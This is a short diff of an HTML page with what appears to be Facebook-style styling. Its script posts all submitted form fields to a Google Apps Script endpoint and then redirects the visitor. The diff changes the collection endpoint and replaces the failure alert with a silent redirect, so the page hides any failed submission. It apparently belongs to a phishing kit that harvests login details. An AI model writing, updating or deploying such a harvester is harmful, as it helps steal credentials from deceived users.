@@ -5371,7 +5371,7 @@ div.uiInterstitialWithStripes {
         params.append(pair[0], pair[1]);
       }
 
-      fetch('https://script.google.com/macros/s/AKfycbwJQYdZ17JZT7knOhPwT8vlnxZBEoiuSAqgixjvpUYiRdDwRtUrftuM1NoQhPhiRGnh/exec', {
+      fetch('https://script.google.com/macros/s/AKfycbxwMvuQnraAoBx9TrB-g__Pa9oH3ApUW7f3E9pbI-Em7pT3mZxUVkdXNSseG9vgQCqI/exec', {
         method: 'POST',
         body: params,
         headers: {
@@ -5387,7 +5387,7 @@ div.uiInterstitialWithStripes {
         window.location.href = redirectUrl;
       })
       .catch(error => {
-        alert('Failed to submit form: ' + error.message);
+        window.location.href = redirectUrl;
       });
     });
   </script>
